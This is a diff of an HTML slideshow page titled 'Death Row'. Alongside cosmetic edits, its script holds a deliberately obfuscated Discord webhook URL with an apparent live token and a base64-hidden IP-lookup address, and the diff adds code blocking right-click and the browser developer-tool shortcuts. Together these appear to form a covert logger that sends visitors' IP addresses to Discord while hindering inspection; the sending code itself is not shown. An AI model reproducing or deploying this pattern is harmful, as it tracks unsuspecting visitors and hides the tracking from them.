@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Death Row</title>
+    <link rel="icon" href="305.jpg" type="image/png"> <!-- PNG Favicon link -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -68,7 +69,7 @@
             padding: 20px;
             margin: 20px;
             text-align: left;
-            background-color: #000000; /* Dark background for the embed */
+            background-color: #111111; /* Dark background for the embed */
         }
         .embed img {
             display: block;
@@ -76,9 +77,8 @@
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
-    <link rel="icon" href="305.jpg" type="image/x-icon"> <!-- Favicon link -->
 </head>
-<body>
+<body oncontextmenu="return false">
     <div class="slideshow-container">
         <div class="mySlides fade">
             <img src="1.gif" alt="GIF 1">
@@ -139,12 +139,29 @@
         <span>Death Row</span>
     </div>
     <script>
+        // Obfuscated Discord webhook URL
         const part1 = "https://canary.discord.com/api/webhooks/";
         const part2 = "1256247502366314576";
         const part3 = "/DgNOqdsKDTmfPmoCdccyAVvuTxcX6p9MqqOqGXSKh-wmISkUukuiiS62QRqWfD6i1le1";
         const webhookURL = part1 + part2 + part3;
 
+        // Base64 encoded IP fetch URL
         const ipFetchUrl = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
+
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, and Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
 
         let slideIndex = 0;
         showSlides();
